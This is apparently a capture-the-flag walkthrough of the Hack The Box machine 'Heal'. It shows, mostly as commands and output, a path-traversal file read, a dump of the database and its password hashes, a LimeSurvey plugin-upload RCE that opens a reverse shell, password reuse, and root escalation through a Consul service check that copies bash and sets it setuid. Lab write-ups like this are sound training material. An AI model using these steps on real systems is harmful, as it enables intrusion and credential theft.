# Heal

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 -sV -p- heal.htb   
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-24 20:41 EDT
Nmap scan report for heal.htb (10.10.11.46)
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 503 Service Temporarily Unavailable
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When we generate our pdf, we have the following request being make to the api

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fq3VKClUMjfisSDzaMXEm%2Fimage.png?alt=media&#x26;token=f710238f-1dff-4795-9f4c-22847222dace" alt=""><figcaption></figcaption></figure>

It il vulnerable to file inclusion

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl '<http://api.heal.htb/download?filename=../../../../../../etc/passwd>' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' -H 'Origin: <http://heal.htb>' -H 'Connection: keep-alive' -H 'Referer: <http://heal.htb/>'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

The website uses a db located in storage/development.sqlite3

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl '<http://api.heal.htb/download?filename=../../config/database.yml>' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxfQ.xUpLkii7aY8TfhsKxvSTKYR9GvjNLfTwsYyazWELjlk' -H 'Origin: <http://heal.htb>' -H 'Connection: keep-alive' -H 'Referer: <http://heal.htb/>'
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

We can dump the db

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl '<http://api.heal.htb/download?filename=../../storage/development.sqlite3>' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxfQ.xUpLkii7aY8TfhsKxvSTKYR9GvjNLfTwsYyazWELjlk' -H 'Origin: <http://heal.htb>' -H 'Connection: keep-alive' -H 'Referer: <http://heal.htb/>' --output dev.sqlite3
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 32768  100 32768    0     0   123k      0 --:--:-- --:--:-- --:--:--  124k
```

```bash
sqlite> .tables
ar_internal_metadata  token_blacklists    
schema_migrations     users               
sqlite> select * from users;
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|test@test.com|$2a$12$7S4UPZuLrrTYRR3ZjGToPeaB74Q.WOFc4E/43Hk36eLKhocEh8pfy|2025-10-25 00:51:12.980323|2025-10-25 00:51:12.980323|test|test|0
```

ralph:147258369

We have the lime survey, which lets us login with the creds

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fry6HP8H0dEKbslm1Mp3H%2Fimage.png?alt=media&#x26;token=d2f754e2-9191-4a81-a0f1-d14779de120c" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FaIFmf4ZEONFWMFjzmT5K%2Fimage.png?alt=media&#x26;token=76a06691-cead-449d-a3de-8d9a6d12e95a" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FbOdf2v0ONmasVDgzG8sn%2Fimage.png?alt=media&#x26;token=a313c7b9-9764-4753-a305-a0a83bd6dbd7" alt=""><figcaption></figcaption></figure>

```bash
┌──(kali㉿kali)-[~/Downloads/Limesurvey-6.6.4-RCE]
└─$ python3 exploit.py <http://take-survey.heal.htb/> ralph 147258369 80 
 _   _ _  _  ____  _ ____  _     _ 
| \\ | | || |/ ___|/ |  _ \\| |   / |                                                                                                                                                                                                         
|  \\| | || |\\___ \\| | |_) | |   | |                                                                                                                                                                                                         
| |\\  |__   _|__) | |  _ <| |___| |                                                                                                                                                                                                         
|_| \\_|  |_||____/|_|_| \\_\\_____|_|                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[INFO] Retrieving CSRF token for login...
[SUCCESS] CSRF Token Retrieved: d21wRFBtUE42Vm0yRFBOR2FabW41N0lRQ2xqWG53NXod5LyMNVj4QnSqffvUBOKoZtFmHlnJg0-_ZCxy8-Lrug==

[INFO] Sending Login Request...                                                                                                                                                                                                             
[SUCCESS] Login Successful!

[INFO] Uploading Plugin...                                                                                                                                                                                                                  
[SUCCESS] Plugin Uploaded Successfully!

[INFO] Installing Plugin...                                                                                                                                                                                                                 
[SUCCESS] Plugin Installed Successfully!

[INFO] Activating Plugin...                                                                                                                                                                                                                 
[SUCCESS] Plugin Activated Successfully!

[INFO] Triggering Reverse Shell...
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.46] 51942
Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 02:25:31 up  1:45,  0 users,  load average: 0.05, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@heal:/dev/shm$ cat /var/www/limesurvey/application/config/config.php 
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),
```

```bash
www-data@heal:/dev/shm$ su ron 
Password: 
ron@heal:/dev/shm$
```

We find a service named consul, running on port 8500 as root

```bash
ron@heal:/tmp$ ss -tulpn
tcp   LISTEN    0    4096       127.0.0.1:8500

ron@heal:/etc/systemd/system$ cat consul.service 
[Unit]
Description=Consul Service Discovery Agent
After=network-online.target
Wants=network-online.target

[Service]
User=root
Group=root
ExecStart=/usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
Restart=on-failure
ExecReload=/bin/kill --signal HUP $MAINPID
KillMode=process
KillSignal=SIGTERM
SyslogIdentifier=consul
[Install]
WantedBy=multi-user.target
```

We can create a new service

```bash
nano test.json
{
  "Name": "0xdf service",
  "ID": "rev-shell",
  "Port": 0,
  "Check": {
      "args": ["bash", "-c", "cp /bin/bash /tmp/0xdf && chmod 6777 /tmp/0xdf"],
      "interval": "30s",
      "timeout": "5s"
  }
}
```

Upload the new service with a request to the API

```bash
ron@heal:/dev/shm$ curl -X PUT <http://127.0.0.1:8500/v1/agent/service/register> -H "Content-Type: application/json" -T test.json
```

Privesc

```bash
ron@heal:/dev/shm$ cd /tmp
ron@heal:/tmp$ ./shell -p
shell-5.1# id 
uid=1001(ron) gid=1001(ron) euid=0(root) egid=0(root) groups=0(root),1001(ron)
```

FOUND BUT DIDN’T END UP BEING USEFUL

In the config folder, we can read the master key file

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl '<http://api.heal.htb/download?filename=../../config/master.key>' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' -H 'Origin: <http://heal.htb>' -H 'Connection: keep-alive' -H 'Referer: <http://heal.htb/>'
23d5052b447ee9376809464f8c141bdf
```

We can then read encrypted credentials ⇒ it contains the key to encrypt cookies

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl '<http://api.heal.htb/download?filename=../../config/credentials.yml.enc>' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' -H 'Origin: <http://heal.htb>' -H 'Connection: keep-alive' -H 'Referer: <http://heal.htb/>'
1dMkoxx+3u+vK2g1BWntnRZqGj16vLi5rQJlP/P+pcIpGeK7b12TC2UWjrdx+PoC3iYnMWS2QLK5jnBnaNXDHpEL9oDgc6Ul/9/ghl+3g4AzaFeHy1/yG6SMxA11CMmQhTcSGj1jBMyCT7dgmV6/hfCyb933QHukceAV1NVHqLH9Tcd+WnB3okQhD3NUOLhZ3ivc3wr2pyvxX7ym5kLIjSuHNwRcmMwcXS3e26Bc3Lk9ghUq795a90WfGtV7cIa2TzdY5lbMHHi167IP3zzpUvmY0AcR+WmXHt35WjktrELPe7hR83MRHwTrWt3OmqafsPBufCl1oUY1K2sEIJ8VQjHhrP870ASSS3BpEiGSdrCU53jNVIquJwaE8lg0p3phhMbLXYVVT9QZO1banDh5avfcmSEM--dsbT6QUqCzyNMigC--9SEHtK8HjvpnlvfmWIqoMg==
```

We can decrypt this creds files

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 dec.py creds.yaml.enc key 
"/# aws:
#   access_key_id: 123
#   secret_access_key: 345

# Used as the base secret for all MessageVerifiers in Rails, including the one protecting cookies.
secret_key_base: 7c54b3ab1c9f9d5037c8f8c856b4be85f4eca365430232a6743965665fbeec9c30e86dad314aa54ed90986223bc7841c89c2442a0e7e6b546a9366f4d3d8dc2d
```

The secret\_key\_base is used to sign the application cookies

In our case, jwt are being used so we can craft a cookie

Current cookie

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FSbSkTWB7OjMTMCWB2zbn%2Fimage.png?alt=media&#x26;token=8ae62b5c-1511-4a9c-b64f-9208bc8c37fa" alt=""><figcaption></figcaption></figure>

Change the ID to 1 and sign the JWT

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FuzyF4bur1UII6IaZcL3X%2Fimage.png?alt=media&#x26;token=ef0f568a-e463-436b-b3d9-783ae84f5b3d" alt=""><figcaption></figcaption></figure>

We can then inject the cookie in our local storage and log in as the website admin
